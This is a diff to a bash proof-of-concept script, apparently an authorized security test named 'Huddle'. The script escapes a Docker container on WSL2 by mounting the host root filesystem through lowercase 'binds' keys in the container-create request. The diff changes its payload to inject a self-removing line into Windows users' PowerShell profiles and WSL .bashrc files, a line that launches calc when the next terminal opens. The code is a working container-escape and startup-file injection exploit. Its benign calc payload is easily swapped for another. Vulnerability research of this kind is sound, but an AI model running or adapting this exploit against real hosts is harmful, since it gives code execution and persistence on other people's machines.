@@ -12,7 +12,7 @@
 #   names:  1a   #1 top-level lowercase `hostconfig`      → pop calc (host PID ns)
 #           1b   #1 nested lowercase keys under HostConfig → pop calc (host PID ns)
 #           1c   #1 minimal: `binds` only                 → host-fs read+write
-#           fs   #1 filesystem-only calc pop               → write calc.bat to Startup
+#           fs   #1 filesystem-only calc pop               → PS profile injection
 #           7    #7 privileged exec-create                → host raw-disk (best-effort)
 #           mask MaskedPaths unmask (NON-destructive probe, no sysrq)
 #           list show this table
@@ -177,40 +177,66 @@ echo "wrote proof (host) $P"'
   [[ -z "$CID" ]] && refused
   CLEAN_IDS+=("$CID"); echo "[+] created $CID (host / mounted at /host, rw)"; run_and_log "$CID"
   ;;
-# ── Finding #1 (fs): filesystem-only calc pop via bashrc injection ────────────
+# ── Finding #1 (fs): filesystem-only calc pop via PowerShell profile injection ─
 # No privileged, no pidmode, no nsenter, no binfmt_misc. Mount host rootfs via
 # the 1b-style bypass (lowercase `binds` under properly-cased `HostConfig`).
-# Inject a self-removing one-liner into the host user's ~/.bashrc that pops calc
-# via WSL interop (normal user shells have working binfmt + WSL_INTEROP, unlike
-# our nsenter'd container context). Triggers the moment ANY new terminal opens.
+# The host is a Docker-specific WSL2 distro — no user shells ever open there.
+# But /host/mnt/c/ gives us the Windows filesystem. Inject a self-removing
+# one-liner into the Windows user's PowerShell profile: fires on next terminal
+# (PowerShell, Windows Terminal, VS Code integrated terminal).
 fs)
   pull
   FSPOP='set +e
-echo "[*] host rootfs at /host — scanning for user home dirs ..."
-BASHRC=""
-for rc in /host/home/*/.bashrc /host/root/.bashrc; do
-  [ -f "$rc" ] && { BASHRC="$rc"; break; }
-done
-if [ -z "$BASHRC" ]; then
-  echo "[!] no .bashrc found on host"
-  exit 1
-fi
-echo "[+] target: $BASHRC"
-# Unique marker for self-removal
+echo "[*] host rootfs at /host — scanning for Windows users ..."
 MARKER="HUDDLE_POC_CALCPOP"
-# The injected line: launch calc via cmd.exe interop, then remove itself from
-# bashrc. All in one line so cleanup is atomic. Uses a background subshell so
-# the terminal open is not blocked.
-LINE="# ${MARKER} — PoC injected by Huddle security test (self-removing)"
-PAYLOAD="( cmd.exe /c start calc >/dev/null 2>&1 & ); sed -i \"/${MARKER}/d\" ~/{.bashrc,.profile} 2>/dev/null # ${MARKER}"
-echo "$LINE" >> "$BASHRC"
-echo "$PAYLOAD" >> "$BASHRC"
-echo "[+] injected 2 lines into $BASHRC (self-removing on first trigger)"
-echo "[*] proof: host /etc/hostname = $(cat /host/etc/hostname 2>/dev/null)"
-echo "[*] injected content:"
-grep "$MARKER" "$BASHRC"
+INJECTED=0
+
+# ── PowerShell profiles (fires on any PS / Windows Terminal / VS Code terminal)
+for userdir in /host/mnt/c/Users/*/; do
+  user=$(basename "$userdir")
+  case "$user" in Public|Default|Default\ User|All\ Users) continue;; esac
+  [ -d "$userdir" ] || continue
+
+  # WindowsPowerShell (PS5) + PowerShell (PS7) profile paths
+  for psdir in \
+    "${userdir}Documents/WindowsPowerShell" \
+    "${userdir}Documents/PowerShell" \
+    "${userdir}OneDrive/Documents/WindowsPowerShell" \
+    "${userdir}OneDrive/Documents/PowerShell"; do
+    # Only target dirs that exist (do not create profile dirs that never existed)
+    [ -d "$psdir" ] || continue
+    PROF="$psdir/Microsoft.PowerShell_profile.ps1"
+    # Skip if already injected
+    grep -q "$MARKER" "$PROF" 2>/dev/null && continue
+    # Self-removing one-liner: Start calc, then strip all marker lines from profile
+    echo "# ${MARKER}" >> "$PROF"
+    echo "Start-Process calc; (Get-Content \$PROFILE | Where-Object { \$_ -notmatch '\''"${MARKER}"'\'' }) | Set-Content \$PROFILE # ${MARKER}" >> "$PROF"
+    echo "[+] injected into $PROF"
+    INJECTED=$((INJECTED + 1))
+  done
+done
+
+# ── Also try the user WSL distros (if cross-mounted at /mnt/wsl or visible)
+for rc in /host/home/*/.bashrc; do
+  [ -f "$rc" ] || continue
+  grep -q "$MARKER" "$rc" 2>/dev/null && continue
+  echo "# ${MARKER} — PoC injected by Huddle security test (self-removing)" >> "$rc"
+  echo "( cmd.exe /c start calc >/dev/null 2>&1 & ); sed -i \"/${MARKER}/d\" ~/{.bashrc,.profile} 2>/dev/null # ${MARKER}" >> "$rc"
+  echo "[+] injected into $rc (WSL distro bashrc)"
+  INJECTED=$((INJECTED + 1))
+done
+
 echo ""
-echo "[*] calc will pop when any WSL terminal opens. Lines auto-remove after."'
+echo "[*] proof: host /etc/hostname = $(cat /host/etc/hostname 2>/dev/null)"
+if [ "$INJECTED" -gt 0 ]; then
+  echo "[+] injected $INJECTED profile(s). Calc pops on next terminal open."
+  echo "[*] all injections self-remove after first trigger."
+else
+  echo "[!] no profile targets found — writing proof file instead"
+  echo "HUDDLE HOST-ESCAPE PoC — filesystem write confirmed" > /host/tmp/huddle-poc-proof.txt
+  echo "host: $(cat /host/etc/hostname 2>/dev/null)" >> /host/tmp/huddle-poc-proof.txt
+  echo "[+] wrote /host/tmp/huddle-poc-proof.txt"
+fi'
   CID=$(create_raw "huddle-$STAMP" \
     "{\"Image\":\"$IMAGE\",\"Cmd\":$(cmd_json "$FSPOP"),\"HostConfig\":{\"binds\":[\"/:/host\"]}}")
   [[ -z "$CID" ]] && refused
